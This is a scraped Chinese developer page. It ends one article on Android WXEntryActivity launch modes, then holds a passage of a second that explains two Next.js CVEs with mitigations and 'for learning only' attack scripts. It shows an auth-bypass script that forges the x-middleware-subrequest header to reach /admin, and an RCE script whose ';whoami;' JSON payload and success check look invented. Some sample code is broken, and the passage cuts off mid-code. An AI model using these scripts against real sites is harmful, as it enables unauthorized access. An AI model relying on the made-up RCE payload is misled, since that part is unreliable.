                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Android 应用开发中，集成微信登录、支付或小程序跳转等功能时，我们常常需要定义一个特定的回调 Activity，即 <code>WXEntryActivity</code>。最近，调试小程序遇到了一个让人困惑的问题：<strong>从微信小程序返回 App 时，App收到了相关信息，但无法正常展示离开的页面。</strong></p>
<p>经过一番排查和调整，终于找到了问题的根源，之前代码中误将 <code>WXEntryActivity</code> 的 <code>launchMode</code> 设置为了 <code>"singleInstance"</code> ，修改为 <code>"singleTask"</code> 后，恢复正常。</p>
<p>本文将分析这背后的原理，进一步理解 Android Activity 的 <strong>任务栈 (Task Stack)</strong> 机制，以及这两种 <code>launchMode</code> 在微信回调场景中的巨大差异。</p>
<hr/>
<h3 data-id="heading-0">一、问题现象与解决方案</h3>
<h4 data-id="heading-1">❌ 遇到的问题：</h4>
<p>当用户在 App 内启动微信小程序，完成操作后，点击左上角的“返回 App”按钮，或者微信回调启动 <code>WXEntryActivity</code> 处理结果后，App 无法正确返回到启动小程序的前一个页面，表现为界面停滞或回到了一个不正确的状态。</p>
<h4 data-id="heading-2">✅ 解决方案：</h4>
<p>将项目 <code>AndroidManifest.xml</code> 中 <code>WXEntryActivity</code> 的 <code>android:launchMode</code> 配置从 <code>"singleInstance"</code> 修改为 <code>"singleTask"</code>。</p>
<p>XML</p>
<pre><code class="hljs language-ini" lang="ini">&lt;activity
    android:<span class="hljs-attr">name</span>=<span class="hljs-string">"com.xxx.wxapi.WXEntryActivity"</span>
    android:<span class="hljs-attr">launchMode</span>=<span class="hljs-string">"singleTask"</span>
    android:<span class="hljs-attr">exported</span>=<span class="hljs-string">"true"</span>
    ...
/&gt;
</code></pre>
<hr/>
<h3 data-id="heading-3">二、<code>singleInstance</code> 为什么会导致“返回失败”？</h3>
<p>理解这个问题，关键在于理解 <code>singleInstance</code> 对 Activity 任务栈的极端要求。</p>
<h4 data-id="heading-4">1. <code>launchMode="singleInstance"</code> 的机制：</h4>
<p>当 Activity 被设置为 <code>singleInstance</code> 时，系统会强制执行以下两个规则：</p>
<ul>
<li><strong>独立任务栈：</strong> 无论何时启动这个 Activity，系统都会为它创建一个<strong>全新的、独立的任务栈 (Task Stack)</strong> 。</li>
<li><strong>栈中唯一：</strong> 这个任务栈中<strong>只允许存在这一个 Activity 实例</strong>。</li>
</ul>
<h4 data-id="heading-5">2. 微信回调中的“迷航”：</h4>
<ol>
<li><strong>启动：</strong> App 的某个页面 <code>A</code> 启动了微信小程序。</li>
<li><strong>回调：</strong> 微信小程序完成后，回调启动 <code>WXEntryActivity</code>。此时，<code>WXEntryActivity</code> 因为是 <code>singleInstance</code>，它被放置在了一个<strong>全新的、独立的任务栈 T2</strong> 中。</li>
<li><strong>App 状态：</strong> 您的 App 主任务栈 <strong>T1</strong>（包含 <code>A</code> Activity 等）仍然存在于后台。</li>
<li><strong>返回失败：</strong> <code>WXEntryActivity</code> (在 T2 中) 处理完数据后，通常会调用 <code>finish()</code> 结束自己。由于 T2 栈中只有它一个 Activity，T2 任务栈也会随之销毁。然而，系统在销毁 T2 之后，<strong>并没有正确地将 T1 任务栈中的顶部 Activity (即 A)</strong> 重新带到前台。这导致用户体感上就是“无法返回”。</li>
</ol>
<hr/>
<h3 data-id="heading-6">三、<code>singleTask</code> 如何完美解决问题？</h3>
<p><code>singleTask</code> 模式是专门为这种“中转站”和“入口”类 Activity 设计的最佳选择。</p>
<h4 data-id="heading-7">1. <code>launchMode="singleTask"</code> 的机制：</h4>
<ul>
<li>
<p><strong>寻找任务栈：</strong> Activity 启动时，系统会搜索系统中是否存在与该 Activity <strong><code>taskAffinity</code></strong> 匹配的任务栈。</p>
</li>
<li>
<p><strong>重复利用：</strong> 如果目标任务栈（即我们的 <strong>App 主任务栈 T1</strong>）存在：</p>
<ul>
<li><strong>Activity 会被放置在 T1 中。</strong></li>
<li>如果 T1 栈中已经存在该 Activity 实例，系统会清除位于该实例之上的所有 Activity，使它成为栈顶，并调用它的 <code>onNewIntent()</code> 方法。</li>
</ul>
</li>
<li>
<p><strong>栈中唯一：</strong> 在一个任务栈内，<code>WXEntryActivity</code> 始终<strong>只有一个实例</strong>。</p>
</li>
</ul>
<h4 data-id="heading-8">2. 正确的回调与返回流程：</h4>
<ol>
<li>
<p><strong>启动：</strong> App 的 Activity <code>A</code> 启动微信小程序。</p>
</li>
<li>
<p><strong>回调：</strong> 微信小程序回调启动 <code>WXEntryActivity</code>。由于是 <code>singleTask</code>，系统会把 <code>WXEntryActivity</code> <strong>直接放置在 App 的主任务栈 T1 的栈顶</strong>，位于 <code>A</code> 的上方。</p>
<ul>
<li><strong>任务栈 T1 状态：</strong> <code>... -&gt; Activity B -&gt; Activity A -&gt; WXEntryActivity (栈顶)</code></li>
</ul>
</li>
<li>
<p><strong>正常返回：</strong> <code>WXEntryActivity</code> (在 T1 中) 处理完数据后，调用 <code>finish()</code> 结束自己。</p>
</li>
<li>
<p><strong>完美衔接：</strong> <code>WXEntryActivity</code> 出栈后，<code>Activity A</code> 自然而然地成为 T1 的栈顶，系统会将其带到前台，<strong>完美地回到了启动小程序的前一个页面</strong>，符合用户预期。</p>
</li>
</ol>
<hr/>
<h3 data-id="heading-9">总结与最佳实践</h3>
<p>对于微信回调接口 <code>WXEntryActivity</code> 而言，它的核心职责是：<strong>接收回调结果，处理数据，然后迅速退出，将控制权交还给 App 的主业务页面。</strong></p>























<table><thead><tr><th><strong>launchMode</strong></th><th><strong>适用场景</strong></th><th><strong>微信回调场景</strong></th><th><strong>结果</strong></th></tr></thead><tbody><tr><td><strong><code>singleInstance</code></strong></td><td>需要完全独立、隔离的“单一窗口”应用，如闹钟、来电显示等。</td><td><strong>❌ 不适用</strong>，创建独立任务栈，返回时无法正确激活主 App 栈。</td><td><strong>返回失败/卡顿</strong></td></tr><tr><td><strong><code>singleTask</code></strong></td><td>业务流程中的“中转站”或“主入口”，确保其只有一个实例，且位于主任务栈。</td><td><strong>✅ 最佳实践</strong>，确保 Activity 位于主任务栈顶部，<code>finish()</code> 后完美返回。</td><td><strong>返回正常</strong></td></tr></tbody></table>
<p><strong>建议：</strong> 在集成任何需要回调的第三方 SDK (如微信、支付宝) 时，其回调 Activity 的 <code>launchMode</code> 几乎都应该选择 <strong><code>singleTask</code></strong>，以确保其正确集成到 App 的主任务流程中，避免出现任务栈混乱导致的导航问题。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Next.js 近期高危漏洞完整指南：原理 + 攻击示例（前端易懂版）]]></title>    <link>https://juejin.cn/post/7581702285564379186</link>    <guid>https://juejin.cn/post/7581702285564379186</guid>    <pubDate>2025-12-10T02:20:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581702285564379186" data-draft-id="7581702285564362802" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Next.js 近期高危漏洞完整指南：原理 + 攻击示例（前端易懂版）"/> <meta itemprop="keywords" content="前端,Next.js"/> <meta itemprop="datePublished" content="2025-12-10T02:20:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="鲫小鱼"/> <meta itemprop="url" content="https://juejin.cn/user/1046390798032110"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Next.js 近期高危漏洞完整指南：原理 + 攻击示例（前端易懂版）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390798032110/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    鲫小鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:20:08.000Z" title="Wed Dec 10 2025 02:20:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Next.js 近期高危漏洞完整指南：原理 + 攻击示例（前端易懂版）</h2>
<h3 data-id="heading-1">一、漏洞核心信息速览（前端必知）</h3>
<h4 data-id="heading-2">1. 事件背景（时间 + 起因）</h4>
<ul>
<li>
<p><strong>CVE-2025-29927（身份验证绕过）</strong>：2025 年 3 月公开，实际隐藏 4 年！影响 Next.js 11.1.4 ~ 15.2.2 版本，起因是中间件对 <code>x-middleware-subrequest</code> 请求头校验太宽松，外部可伪造。</p>
</li>
<li>
<p><strong>CVE-2025-66478（远程代码执行 RCE）</strong>：2025 年 12 月 4 日披露，CVSS 10.0（最高危），影响 Next.js 15/16 及部分 14.x 测试版，源于 React Server Components（RSC）协议的反序列化漏洞，服务器会执行恶意请求里的命令。</p>
</li>
</ul>
<h4 data-id="heading-3">2. 漏洞原理（通俗解释）</h4>
<ul>
<li>
<p>绕过漏洞：Next.js 中间件把 <code>x-middleware-subrequest</code> 当作 “内部请求标识”，但没验证是否真的是内部发的，攻击者拼几个合法值就能骗中间件放行。</p>
</li>
<li>
<p>RCE 漏洞：App Router 用 RSC 协议传输组件数据，服务器接收数据时没校验，直接执行里面的命令，相当于给攻击者开了 “服务器操作权限”。</p>
</li>
</ul>
<h4 data-id="heading-4">3. 核心危害（前端能感知的影响）</h4>
<ul>
<li>
<p>绕过漏洞：别人不用登录就能进后台（如 <code>/admin</code>），偷敏感数据、篡改内容。</p>
</li>
<li>
<p>RCE 漏洞：最致命！攻击者能操控服务器，偷数据库密码、植入挖矿程序（让服务器变 “肉鸡”）、删除业务数据，甚至瘫痪服务。</p>
</li>
</ul>
<h4 data-id="heading-5">4. 快速预防方案（前端直接能用）</h4>
<ol>
<li>
<p>优先升级：按版本对应升级（15.x→≥15.3.6；14.x→≥14.2.25；13.x→≥13.5.9）。</p>
</li>
<li>
<p>临时防护：用 Nginx/Cloudflare 拦截 <code>x-middleware-subrequest</code> 请求头（禁止外部提交）。</p>
</li>
<li>
<p>代码层面：关键路由（如登录、支付）不要只靠中间件校验，加二次验证（如接口层查 token 有效性）。</p>
</li>
</ol>
<h4 data-id="heading-6">5. 涉及核心知识点（前端关联技能）</h4>
<ul>
<li>
<p>Next.js 中间件：运行在请求最前面的校验逻辑，不是前端代码，是服务端轻量函数。</p>
</li>
<li>
<p>RSC（React Server Components）：App Router 核心，服务端渲染组件的协议，数据传输要校验。</p>
</li>
<li>
<p>请求伪造：客户端可篡改请求头 / 请求体，服务端不能 “无条件信任”。</p>
</li>
<li>
<p>依赖安全：框架底层漏洞只能靠升级修复，定期用 <code>npm audit</code> 查漏洞。</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-7">二、攻击代码示例（仅用于学习，严禁非法使用）</h3>
<blockquote>
<p>⚠️ 注意事项：</p>
</blockquote>
<ol>
<li>
<p>以下代码仅用于 <strong>漏洞原理学习</strong>，严禁用于攻击真实网站，否则需承担法律责任！</p>
</li>
<li>
<p>测试仅允许在自己搭建的漏洞环境（如本地部署受影响版本的 Next.js 项目）中进行。</p>
</li>
<li>
<p>演示脚本聚焦 “攻击核心逻辑”，省略了真实攻击中的扫描、持久化等步骤，突出 “如何触发漏洞”。</p>
</li>
</ol>
<h4 data-id="heading-8">（一）CVE-2025-29927（身份验证绕过漏洞）攻击示例</h4>
<h5 data-id="heading-9">漏洞核心</h5>
<p>伪造 <code>x-middleware-subrequest</code> 请求头，绕过中间件的登录校验，直接访问受保护路由（如 <code>/admin</code>）。</p>
<h5 data-id="heading-10">攻击脚本：<code>bypass-auth.js</code></h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 需先执行：npm install axios</span>

<span class="hljs-keyword">const</span> axios = <span class="hljs-built_in">require</span>(<span class="hljs-string">'axios'</span>);

<span class="hljs-comment">// 目标地址（自己搭建的测试项目）</span>

<span class="hljs-keyword">const</span> targetUrl = <span class="hljs-string">'http://localhost:3000/admin'</span>;

<span class="hljs-comment">// 核心：伪造请求头，触发中间件绕过</span>

<span class="hljs-keyword">const</span> attackConfig = {

   <span class="hljs-attr">headers</span>: {

     <span class="hljs-comment">// 关键：拼接 5 次合法标识，触发新版本漏洞绕过</span>

     <span class="hljs-string">'x-middleware-subrequest'</span>: <span class="hljs-string">'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'</span>,

     <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'</span> <span class="hljs-comment">// 伪装浏览器</span>

   }

};

<span class="hljs-comment">// 发送攻击请求</span>

axios.<span class="hljs-title function_">get</span>(targetUrl, attackConfig)

   .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'攻击结果：'</span>);

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'状态码：'</span>, response.<span class="hljs-property">status</span>);

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'响应内容（前500字符）：'</span>, response.<span class="hljs-property">data</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">500</span>));

     <span class="hljs-keyword">if</span> (response.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) {

       <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'✅ 身份验证绕过成功！已访问受保护的 /admin 路由'</span>);

     }

   })

   .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'攻击失败：'</span>, error.<span class="hljs-property">message</span>);

   });
</code></pre>
<h5 data-id="heading-11">测试环境搭建（本地复现用）</h5>
<ol>
<li>新建受影响版本的 Next.js 项目（如 15.2.2）：</li>
</ol>
<pre><code class="hljs language-lua" lang="lua">npx <span class="hljs-built_in">create</span>-<span class="hljs-built_in">next</span>-app@<span class="hljs-number">15.2</span><span class="hljs-number">.2</span> test-vuln-project

cd test-vuln-project
</code></pre>
<ol>
<li>创建中间件 <code>src/middleware.js</code>（模拟登录校验）：</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'next/server'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params">req</span>) {

   <span class="hljs-comment">// 简单校验：没有登录 cookie 就拦截跳转到登录页</span>

   <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">cookies</span>.<span class="hljs-property">token</span>) {

     <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'/login'</span>, req.<span class="hljs-property">url</span>));

   }

   <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();

}

<span class="hljs-comment">// 仅对 /admin 路由生效</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> config = { <span class="hljs-attr">matcher</span>: <span class="hljs-string">'/admin'</span> };
</code></pre>
<ol>
<li>创建 <code>/admin</code> 页面 <code>app/admin/page.js</code>：</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">AdminPage</span>(<span class="hljs-params"/>) {

   <span class="hljs-keyword">return</span> 后台（仅登录可见）\&lt;/h1&gt;;

}
</code></pre>
<h5 data-id="heading-12">运行步骤</h5>
<ol>
<li>
<p>启动测试项目：<code>npm run dev</code></p>
</li>
<li>
<p>运行攻击脚本：<code>node bypass-auth.js</code></p>
</li>
<li>
<p>预期结果：无需登录 cookie，控制台输出 200 状态码和 admin 页面内容，绕过成功。</p>
</li>
</ol>
<hr/>
<h4 data-id="heading-13">（二）CVE-2025-66478（RSC 远程代码执行漏洞）攻击示例</h4>
<h5 data-id="heading-14">漏洞核心</h5>
<p>构造符合 RSC 协议格式的 POST 请求体，注入系统命令（如 <code>whoami</code>），服务器会直接执行该命令。</p>
<h5 data-id="heading-15">攻击脚本：<code>rce-attack.js</code></h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 需先执行：npm install axios</span>

<span class="hljs-keyword">const</span> axios = <span class="hljs-built_in">require</span>(<span class="hljs-string">'axios'</span>);

<span class="hljs-comment">// 目标地址（启用 App Router 的受影响版本项目）</span>

<span class="hljs-keyword">const</span> targetUrl = <span class="hljs-string">'http://localhost:3000'</span>;

<span class="hljs-comment">// 核心：构造 RSC 协议的恶意请求体，注入系统命令</span>

<span class="hljs-keyword">const</span> maliciousBody = {

   <span class="hljs-comment">// RSC 协议固定格式字段（简化版，模拟合法请求）</span>

   <span class="hljs-attr">id</span>: <span class="hljs-string">'123'</span>,

   <span class="hljs-attr">chunks</span>: \[

     <span class="hljs-comment">// 注入恶意命令：Windows 用 "whoami"，Linux/Mac 用 "id"</span>

     <span class="hljs-string">'{"type":"invoke","args":\[";whoami;"]}'</span>

   ],

   <span class="hljs-attr">version</span>: <span class="hljs-string">'0.1'</span>,

   <span class="hljs-attr">mode</span>: <span class="hljs-string">'server-component'</span>

};

<span class="hljs-comment">// 发送攻击请求（RSC 漏洞通过 POST / 触发）</span>

axios.<span class="hljs-title function_">post</span>(targetUrl, maliciousBody, {

   <span class="hljs-attr">headers</span>: {

     <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,

     <span class="hljs-string">'Accept'</span>: <span class="hljs-string">'text/x-component'</span> <span class="hljs-comment">// RSC 协议要求的 Accept 头</span>

   }

})

   .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'攻击结果：'</span>);

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'状态码：'</span>, response.<span class="hljs-property">status</span>);

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'响应内容：'</span>, response.<span class="hljs-property">data</span>);

     <span class="hljs-comment">// 校验命令执行结果（包含路径分隔符即为成功）</span>

     <span class="hljs-keyword">if</span> (response.<span class="hljs-property">data</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'/'</span>) || response.<span class="hljs-property">data</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'\\\\'</span>)) {

       <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'✅ 远程代码执行成功！已获取服务器用户信息'</span>);

     }

   })

   .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'攻击失败：'</span>, error.<span class="hljs-property">response</span>?.<span class="hljs-property">data</span> || error.<span class="hljs-property">message</span>);

   });
</code></pre>
<h5 data-id="heading-16">测试环境搭建（本地复现用）</h5>
<ol>
<li>新建受影响版本的 Next.js 项目（如 15.3.3）：</li>
</ol>
<pre><code class="hljs language-lua" lang="lua">npx <span class="hljs-built_in">create</span>-<span class="hljs-built_in">next</span>-app@<span class="hljs-number">15.3</span><span class="hljs-number">.3</span> test-rce-project

cd test-rce-project
</code></pre>
<ol>
<li>启用 App Router（默认已启用，确保 <code>app/page.js</code> 存在）：</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// app/page.js</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"/>) {

